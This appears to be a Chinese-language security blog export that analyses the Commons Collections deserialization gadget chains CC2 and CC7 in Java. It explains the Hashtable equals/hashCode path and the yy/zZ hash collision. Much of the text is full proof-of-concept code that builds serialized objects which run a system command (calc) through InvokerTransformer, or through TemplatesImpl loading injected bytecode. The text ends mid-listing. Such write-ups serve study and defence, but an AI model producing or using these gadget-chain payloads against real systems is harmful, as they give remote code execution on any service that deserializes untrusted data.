Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 分别看代码： 这一部分就是获取InvokerTransformer的构造方法，然后将一般在加载字节码时需要用到的newTransformer传进去，这里分别在实例化时用到的方法为： InvokerTransformer：\nTransformingComparator就是前面讲过的那个。\nPriorityQueue则是：\n然后继续看：\n这里就是定义了一个数组，为什么是Object[]很好理解，为什么是这个顺序后面会说。\n然后调用反射将queue的值更改为这个数组。\n后续又是反射来更改size值为2，因为我们没有调用add方法，所以不会让size值增加，我们需要改值。\n再后来又是反射修改PriorityQueue的comparator的值为我们的利用链。\n思考一下其实到transform()方法的路线都是一样的，差别就在于这里是直接调用的InvokerTransformer的transform()方法，我们来看一下有些啥特殊之处：\n这里就需要注意这个obj1了，因为InvokerTransformer需要注意传入的值。\n在前面的第一条链子的调试过程中我们很容易可以知道这里的obj1就代表queue[0]里面的templates对象，也就是前面那条链子反序列化时的：\n和\n这样就很清楚了，然后为什么需要前面的是TemplatesImpl类实例，后面的才是其其他值：\n这里主要是因为如果1在前面，那么在调用transform()方法时就会抛出异常然后退出：\n这样就不能达到既定的目的。\n但是如果我们将TemplatesImpl类实例放在前面，那么就会先传入TemplatesImpl，成功完成一次method.invoke()，也就会成功及逆行一次命令执行。虽然同样会报错退出，但是已经达到了既定目的。这也就是需要将TemplatesImpl类实例放在前面的原因。\n那么对于后续的调用的InvokerTransformer类的transform()方法也清楚了： 跟我们之前说的CC3那里异曲同工，还是比较精妙的。\n现在基本就通了，这里就是在动态加载字节码过程中的newInstance()时会触发static代码块，然后弹出计算机。\n所以最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,Tcomparator); //获取默认的ClassPool ClassPool pool = ClassPool.getDefault(); //向ClassPool容器插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //创建Cat类 CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //就是创建static默认方法 cc.makeClassInitializer().insertBefore(cmd); //生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性” String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //更改类名，但是应该直接用Cat就行了，但是用来确保唯一性也是可以的 cc.setName(randomClassName); //设置cc类的父类 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //cc.writeFile(\u0026#34;output\u0026#34;); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功按照预期弹出一个计算机。\n稍微改一点javassist代码就可以得到构造出来的类为： 还有一个点就是为什么在动态加载字节码那里会少一行，这是因为TemplatesImpl类的readObject()方法有定义： 在构造代码时也可以加上，像CC3那样。\n但是我有点小奇怪的就是为啥不用在比如Cat类重写那两个transform()方法，但是无所谓，就算不能用也可以直接使用javassist将transform()方法添加上去即可。\n","date":"2024-07-25T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc2/","title":"CC2"},{"content":"CC7 CC7的思路同样是找另一条调用链来触发lazy.get()方法，这次用到的是Hashtable类\n测试环境：\nJDK 8u411 commons-collections 3.2.1 代码分析 在ysoserial给出的调用链中，选取了java.util.Hashtable#readObject方法作为调用链的起点。\nHashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：\nHashMap 与 Hashtable的父类不一样。 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。 Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key=value的实体放在index=0 的位置。 Hashtable 线程安全，HashMap 线程不安全。 同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。\n分析源码，这个Hashtable类可以给出两条链，分别是\nreadObject()中的reconstitution()的hashCode()方法 readObject()中的reconstitution()的equal()方法 hashCode （其实给这个都可以算到CC6那里去，利用思路和CC6差不多）\n我们来看一下Hashtable的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new StreamCorruptedException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); int origlength = s.readInt(); int elements = s.readInt(); if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); origlength = Math.max(origlength, (int)(elements / lf) + 1); int length = (int)((elements + elements / 20) / lf) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); Hashtable.UnsafeHolder.putLoadFactor(this, lf); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * lf, MAX_ARRAY_SIZE + 1); count = 0; for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); } } 重点还是最后面那串代码，如下： 在readObject方法中，最后调用了reconstitutionPut方法将反序列化得到的key-value 放在内部实现的 Entry 数组 table里。\n跟进reconstitutionPut方法源码：\n可以看见这个reconstitutionPut()里面也调用了hashCode，并且可以很容易看出value不能为null。感觉和HashMap是差不多的，看一下Hashtable类的put()方法： 和CC6那就差不多了，这不就直接可以构造了吗\n直接按照CC6的HashMap的链子原理构造代码即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Hashtable hashMap = new Hashtable(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机。\n————————\nequals 但是ysoserial链中的利用点却不是上面那个简单链，继续分析这个Hashtable类的代码。\n先给出利用链要用到的类以及对应方法的源码：\nHashMap的父类AbstractMap类的equals()方法源码（get方法的起点）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))//这里调用了get方法 return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } LazyMap的父类AbstractMapDecorator的equals()方法源码：\n1 2 3 public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } 在Hashtable 的readObject() 方法中用到了for循环，如下：\n这里的elements代表键值对的个数，这里调用for循环来一次读取一个键值对。并且在反序列化过程中，table(也就是reconstitution方法内的tab)是共享的，也就是说在整个反序列化过程中始终使用同一个 tab，所有的键值对都将被插入到同一个 tab 中，构成一个完整的哈希表，并且看Hashtable类中也有这个变量：\ntable在Hashtable也是有定义的，结合前面的说明，可以知道在反序列化的时候会将键值对放入到这个数组中，但是这里的table是transient修饰的，导致不会被序列化，那么这是如何解决的呢？重点就是在Hashtable#writeObject()方法，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 private void writeObject(java.io.ObjectOutputStream s) throws IOException { Entry\u0026lt;Object, Object\u0026gt; entryStack = null; synchronized (this) { s.defaultWriteObject(); s.writeInt(table.length); s.writeInt(count); for (int index = 0; index \u0026lt; table.length; index++) { Entry\u0026lt;?,?\u0026gt; entry = table[index]; while (entry != null) { entryStack = new Entry\u0026lt;\u0026gt;(0, entry.key, entry.value, entryStack); entry = entry.next; } } } while (entryStack != null) { s.writeObject(entryStack.key); s.writeObject(entryStack.value); entryStack = entryStack.next; } } 在这个writeObject()方法中，定义了一个entryStack用于暂时存储所有的键值对，赋值就是在for循环中，在这个for循环中，遍历table数组的每个Entry对象，将其填入entryStack数组中，最后在while循环中将每个键值对序列化。\n继续看reconstitutionput()方法：\n这个for循环代码会遍历链表，直到链表末尾。同时在for循环内部，可以看到只要当前节点的哈希值与目标哈希值相等以及当前节点的键与目标键相等就会抛出异常\n所以这个代码的作用就是确保哈希表中不会出现重复的键。如果在遍历链表过程中发现有节点的哈希值和键都与目标值相同，就会抛出 StreamCorruptedException 异常。这可能用于序列化/反序列化过程中，防止数据结构被破坏或出现不一致的情况。\n如果没有重复的键，在这个for循环过后，将会将这个键值对填入到table数组中：\n既然这里都说明了是利用equal()方法来创建利用链，在这个reconstitutionPut()方法源码中，可以看到在for循环那里要利用到了equals()方法：\n由于java中的\u0026amp;\u0026amp;有短路求值的特性，必须要前一个条件（e.hash == hash）为真，才会进行第二个条件（e.key.equals(key)）的判断。\n所以我们这里至少put进两个键值对，这样在第二个键值对与第一个键值对比较时才有可能通过第一个条件。\n再结合前面提前给出的类，大概可以知道利用链了，这里将e.key设置为LazyMap类实例，但是LazyMap中并没有直接定义equals()方法（内部类有，但是不能直接调用），这样就会调用LazyMap的父类AbstractMapDecorator的equals()方法：\n这里的this 关键字在方法中代表当前类的实例，即调用该方法的对象。如果相同就会直接返回ture，否则就会调用后面的。而我们的利用链就是要调用后面的。\n由于我们实例化LazyMap时，都是传入一个HashMap类实例，最终会将AbstractMapDecorator的this.map设置为HashMap类的实例化对象，这样就会调用HashMap类的equals()方法，但是情况同LazyMap一样，会直接调用父类AbstractMap的equals()方法（部分源码）：\n然后在AbstractMap的equals()方法中调用了get()方法，这就是起点，并且这里的m就是e.key.equals(key)中的第二个key，所以我们需要传入两个LazyMap实例。\n大概就是这样了，现在来搓代码。\n综合前面的问题：\n需要传入两个键值对。需要将e.key设置为LazyMap对象，即key都是LazyMap对象 hash相等问题 先给个基本盘：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); Hashtable hashtable = new Hashtable(); //这里开始想代码 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 现在聚焦于readObject()的reconstitutionPut方法：\n这里要求前面的条件相等，并且后面的e.key需要为LazyMap类实例，那么我就传入两个LazyMap类实例\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); 再粘过来Hashtable类的put方法一下： 这样就可以基本说明为什么我可以调用Hashtable的put方法了（需要注意的是第一次put不会触及for循环，因为table无任何条目，第二次put才会开始比较）。\n但是需要注意的是，当我传入了LazyMap实例，无论是反序还是put方法这里，在key.hashCode()都不会是首先调用默认的String.java的hashCode()方法了，由于LazyMap没有定义hashCode方法，这里就会到父类AbstractMapDecorator的hashCode方法：\n这里就会又到HashMap（HashMap内部类有hashCode，不可用）父类AbstractMap的hashCode()方法： （这里往后的hashCode()方法调用过程是后面的某个测试代码调试出来的，可以先只暂时了解）然后这里调用的hashCode是HashMap内部类Node类的hashCode()方法，如下：\n然后差不多就到了String.java的hashCode方法：\nString.java的hashCode()就是用来计算哈希码的。同时注意（重要）：在上上面那个hashCode()，也就是内部类Node的hashCode()方法对key和value都调用了hashCode()计算哈希码后异或求得值，也就是最终的哈希码，所以对于最终的哈希码我们需要兼顾键和值。\n————\n结合String.java的hashCode方法，可以知道AbstractMap的hashCode方法的作用就是计算哈希码，通过迭代器遍历每个条目，调用每个条目的hashCode()方法，然后将得到的哈希码累加到变量h中。最后返回h。\n但是由于我们最开始调用的hashCode()是LazyMap对象，并且由于这个对象里面并没有存储有键值对，所以这里会直接返回0。\n本来我还以为刚好，这样都返回0的话正好使得e.hash=hash可以成立，但是需要注意的是，当我们在序列化之前调用put()的时候，看put()方法的如下源码：\n他这里也有个for循环来防止有重复的键，这个代码的作用就是如果条件成立，也就是条目相匹配，就会将条目entry对应的键的value更改为新的value。再来看我们的代码：\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); 现在的问题就是想这个entry.key.equals(key)是否会通过导致无法正常放入两个键值对。\n直接从第二次放入键值对开始说，这里由于我放入的是LazyMap类实例，本来以为会按照我们前面说的流程走一遍，最后会调用到AbstractMap类的equals()停下，大错特错。看代码\n直接使用如下代码来测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } //output:相等 这里的输出为相等，那这就是说明会进入if条件，导致不能成功放入两个键值对。但是在前面的分析中，如果想要成功构造利用链，那么就必须是传入两个LazyMap的实例。所以这里要想如何解决。打断点来调试一下： 直接按照预期进入到LazyMap父类AbstractMapDecorator的equals()方法： 在前面基本流程那里说过，这里就是判断调用这个equals()方法的对象和传入的object引用的对象是否相同，很不巧的是我们都传入了LazyMap对象，导致了这里使得条件成立，返回true。\n但是，柳暗花明又一村，在调试时，在上面点击下一步后，看：\n这里还要调用一次size()方法（这个size()方法过后就没按照预期走了），所以这里会调用HashMap的size()方法\n这个HashMap的size()方法只是返回当前 HashMap 中存储的键值对的总数。\n这里提到了键值对，那么我们添加一个键值对试试，这里直接对LazyMap对象使用put也行，因为LazyMap的父类实现了put方法： 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xxx\u0026#34;,2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxx\u0026#34;,1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } 这次没有输出，说明这里不相同了，不会进入false，也就可以放入两个值了。\n（遗留一个问题吧，没调出来这里为什么会直接到size()并且影响判断）\n并且这里在调试时确实可以进入到最后的AbstractMap的equals()方法并且最终成功调用LazyMap的get方法： 问题equals()方法调用解决。\n那么现在我们又需要注意第一个条件，前面是直接设定的没有键值对，但是由于第二个条件的解决办法，导致我们这里必须要思考如何使得hash相同，最后调用的hashCode方法： 接用代码测试看看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xx\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxxx\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;相等\u0026#34;); } } } 没有输出，说明不是相同的。这里就涉及到了哈希碰撞的问题，不多说，在ysoserial链中调用的是yy和zZ，这两个值的hashCode()结果是相同的： 同时结合前面最开始调试hashCode那部分说了会调用到HashMap内部类Node的hashCode()方法： 所以这里的value也需要设置为相同的，所以最终的测试代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;相等\u0026#34;); } } } 成功输出相等。\n但是此时将这个代码稍微修改一下又可以用来测试第二个条件（但是有问题），如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } //输出：相等 很怪反正，代码绝对有问题，要么就是我的JVM虚拟机有点问题，直接在最终equals()方法加断点可以到，这里不管put进的键是什么，只要两个值都是1就会输出相等（好像only 1），但是这里都改成其他的比如2就不会了，改成2对于hashCode应该也没有影响，并且代码输出也没有问题。\n那么就可以尝试构造真正的利用链了，还需要注意的就是在第二次put的时候就会执行一次调用链了，此时就需要注意LazyMap的get()方法，和之前的CC6差不多，需要remove，直接打断点来看传进去的值：\n再看进入这个get方法的equals()方法的位置：\n此时的key是lazy0的键，所以这里会对lazy1的哈希表再put进一个值：\n这里结果是1很正常，fakeTransformer链子返回的就是这个。\n所以序列化的时候会向hashMap1中put进一个（yy-1）的键值对，为了在反序列化的时候，让hash值相等，能够成功执行到这里的transform()方法，所以需要remove这个hashMap1中的这个键值对。\n最终构成如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,chain); lazy0.put(\u0026#34;yy\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,chain); lazy1.put(\u0026#34;zZ\u0026#34;, 2); hashtable.put(lazy0,1); hashtable.put(lazy1,2); hashMap1.remove(\u0026#34;yy\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机。\n后面再看发现其实其中有一个点是没有说清楚的，确实在序列化之前是可以成功调用到LazyMap的get()方法，但是对于是否会替换这个问题没有说清楚，也就是对应如下代码：\n在序列化前，这里到底为什么不更换值。前面从构建的代码层面简单说了一下利用方法。现在POC也给出来了，就跟一下底层来查看一下：\n直接打断点于AbstractMap类的equals()方法：\n这里就是期望执行get()方法的地方，由于现在是序列化前，经过代码的构造，不会弹计算机，跟进一下这里会执行的LazyMap类的get()方法：\n由于我们构造的transform执行结果就，是返回一个1，并且最后返回的这个value，所以 m.get(key) 就是返回一个1，也是因为在这里往hashMap1中放进了一个键值对，为了反序列化时能通过hash值相同，所以后面加了一个remove操作。\n继续看：\n所以现在比较的就是value和1的相等关系，而这里的value是2：\n其实从代码层面也能看出来，本来最开始就是put的yy =\u0026gt; 2，这里是肯定不相等的，所以取反后就是true了，true返回了false，所以最后才没有换值。\n这样也能解决为什么前面说的only1就不行了，如果我put进的是1，那么这里就会与transform返回的1相等，最后就会返回true。\n那么我就是要用1呢，如下一个操作就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package java_foundation; import java.util.HashMap; import java.lang.reflect.Field; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import javax.management.BadAttributeValueExpException; import java.lang.Class; import javax.xml.transform.Templates; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import java.util.HashSet; import java.util.Hashtable; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.nio.file.Files; import 